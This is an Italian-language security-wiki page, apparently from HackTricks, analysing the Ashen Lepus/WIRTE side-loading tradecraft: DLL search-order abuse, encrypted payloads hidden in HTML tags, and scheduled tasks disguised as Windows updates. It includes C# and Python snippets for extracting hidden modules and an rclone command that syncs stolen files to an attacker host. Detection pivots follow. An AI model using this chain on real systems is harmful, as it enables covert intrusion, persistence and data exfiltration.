# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica del tradecraft

Ashen Lepus (aka WIRTE) ha messo in pratica un modello ripetibile che concatena DLL sideloading, staged HTML payloads e backdoor modulari .NET per persistere all'interno di reti diplomatiche del Medio Oriente. La tecnica è riutilizzabile da qualsiasi operatore perché si basa su:

- **Archive-based social engineering**: PDF benigni istruiscono i bersagli a scaricare un archivio RAR da un sito di file-sharing. L'archivio contiene un EXE viewer per documenti dall'aspetto realistico, una DLL dannosa nominata come una libreria attendibile (es. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) e un esca `Document.pdf`.
- **DLL search order abuse**: la vittima fa doppio clic sull'EXE, Windows risolve l'import della DLL dalla directory corrente, e il loader dannoso (AshenLoader) viene eseguito all'interno del processo attendibile mentre il PDF esca si apre per evitare sospetti.
- **Living-off-the-land staging**: ogni stadio successivo (AshenStager → AshenOrchestrator → moduli) viene mantenuto off-disk fino al momento dell'uso, consegnato come blob cifrati nascosti all'interno di risposte HTML altrimenti innocue.

## Catena Multi-Stage Side-Loading

1. **Decoy EXE → AshenLoader**: l'EXE side-loads AshenLoader, che esegue reconnaissance sull'host, lo cifra con AES-CTR e lo invia via POST all'interno di parametri rotanti come `token=`, `id=`, `q=` o `auth=` verso percorsi che assomigliano ad API (es., `/api/v2/account`).
2. **HTML extraction**: il C2 rivela il prossimo stadio solo quando l'IP del client si geolocalizza nella regione target e il `User-Agent` corrisponde all'implant, ostacolando le sandbox. Quando i controlli passano, il body HTTP contiene un blob `<headerp>...</headerp>` con il payload AshenStager codificato in Base64 e cifrato con AES-CTR.
3. **Second sideload**: AshenStager viene distribuito insieme a un altro binario legittimo che importa `wtsapi32.dll`. La copia malevola iniettata nel binario recupera altro HTML, questa volta estraendo `<article>...</article>` per recuperare AshenOrchestrator.
4. **AshenOrchestrator**: un controller modulare .NET che decodifica una config JSON in Base64. I campi `tg` e `au` della config vengono concatenati/hashati per formare la chiave AES, che decifra `xrk`. I byte risultanti fungono da chiave XOR per ogni blob modulo recuperato successivamente.
5. **Module delivery**: ogni modulo è descritto tramite commenti HTML che reindirizzano il parser a un tag arbitrario, infrangendo regole statiche che cercano solo `<headerp>` o `<article>`. I moduli includono persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) e file exploration (`FE`).

### Pattern di parsing del contenitore HTML
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Anche se i difensori bloccano o rimuovono un elemento specifico, l'operatore deve solo cambiare il tag indicato nel commento HTML per riprendere la consegna.

### Strumento rapido di estrazione (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Paralleli di evasione dello HTML staging

Recenti ricerche su HTML smuggling (Talos) evidenziano payload nascosti come stringhe Base64 all'interno di blocchi `<script>` in allegati HTML e decodificati via JavaScript a runtime. Lo stesso trucco può essere riutilizzato per risposte C2: mettere in staging blob cifrati dentro un script tag (o altro elemento DOM) e decodificarli in-memory prima di AES/XOR, facendo apparire la pagina come HTML ordinario. Talos mostra anche offuscamento a strati (rinomina degli identificatori più Base64/Caesar/AES) all'interno dei tag script, che si mappa bene ai blob C2 HTML-staged.

## Note sulle varianti recenti (2024-2025)

- Check Point ha osservato campagne WIRTE nel 2024 che si basavano ancora sullo sideloading basato su archive ma usavano `propsys.dll` (stagerx64) come primo stage. Lo stager decodifica il payload successivo con Base64 + XOR (chiave `53`), invia richieste HTTP con un `User-Agent` hardcoded e estrae blob cifrati embedded tra tag HTML. In un branch, lo stage è stato ricostruito da una lunga lista di stringhe IP embeddate decodificate tramite `RtlIpv4StringToAddressA`, poi concatenate nei byte del payload.
- OWN-CERT ha documentato tool WIRTE precedenti in cui il dropper side-loaded `wtsapi32.dll` proteggeva le stringhe con Base64 + TEA e utilizzava il nome della DLL stessa come chiave di decrittazione, quindi offuscava i dati di identificazione host con XOR/Base64 prima di inviarli al C2.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: i loader attuali incorporano chiavi a 256-bit più nonces (es., `{9a 20 51 98 ...}`) e opzionalmente aggiungono un layer XOR usando stringhe come `msasn1.dll` prima/dopo la decrittazione.
- **Key material variations**: loader precedenti usavano Base64 + TEA per proteggere stringhe embeddate, con la chiave di decrittazione derivata dal nome della DLL malevola (es., `wtsapi32.dll`).
- **Infrastructure split + subdomain camouflage**: i server di staging sono separati per strumento, ospitati su ASNs diversi e talvolta frontati da sottodomini dall'aspetto legittimo, così bruciare uno stage non espone il resto.
- **Recon smuggling**: i dati enumerati ora includono elenchi di Program Files per identificare app di valore e sono sempre cifrati prima di lasciare l'host.
- **URI churn**: parametri di query e percorsi REST ruotano tra le campagne (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidando rilevazioni fragili.
- **User-Agent pinning + safe redirects**: l'infrastruttura C2 risponde solo a stringhe UA esatte e altrimenti reindirizza a siti di news/health benigni per mimetizzarsi.
- **Gated delivery**: i server sono geo-fenced e rispondono solo a implant reali. Client non approvati ricevono HTML non sospetto.

## Persistenza e ciclo di esecuzione

AshenStager crea scheduled tasks che si mascherano da job di manutenzione Windows ed eseguono tramite `svchost.exe`, ad esempio:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Questi task rilanciano la catena di sideloading all'avvio o a intervalli, garantendo che AshenOrchestrator possa richiedere moduli freschi senza scrivere nuovamente su disco.

## Using Benign Sync Clients for Exfiltration

Gli operatori mettono in staging documenti diplomatici dentro `C:\Users\Public` (leggibile a tutti e non sospetto) tramite un modulo dedicato, quindi scaricano il binario legittimo di [Rclone](https://rclone.org/) per sincronizzare quella directory con uno storage controllato dall'attaccante. Unit42 nota che è la prima volta che questo attore è stato osservato usare Rclone per esfiltrazione, allineandosi con la tendenza più ampia di abusare di tooling di sync legittimo per mimetizzarsi nel traffico normale:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Poiché Rclone è ampiamente usato per workflow di backup legittimi, i defender devono concentrarsi su esecuzioni anomale (nuovi binari, remotes sospetti, o sincronizzazioni improvvise di `C:\Users\Public`).

## Detection Pivots

- Genera alert su processi **signed** che inaspettatamente caricano DLL da percorsi scrivibili dall'utente (filtri Procmon + `Get-ProcessMitigation -Module`), specialmente quando i nomi delle DLL si sovrappongono a `netutils`, `srvcli`, `dwampi`, o `wtsapi32`.
- Ispeziona risposte HTTPS sospette per **grandi blob Base64 embedded dentro tag insoliti** o protetti da commenti `<!-- TAG: <xyz> -->`.
- Estendi la caccia in HTML a **stringhe Base64 dentro blocchi `<script>`** (stile HTML smuggling) che vengono decodificate via JavaScript prima del processing AES/XOR.
- Cerca **scheduled tasks** che eseguono `svchost.exe` con argomenti non da servizio o che puntano a directory dropper.
- Traccia **C2 redirect** che restituiscono payload solo per `User-Agent` esatti e altrimenti rimbalzano verso domini di news/health legittimi.
- Monitora la presenza di binari **Rclone** fuori dalle location gestite dall'IT, nuovi file `rclone.conf`, o job di sync che estraggono da directory di staging come `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
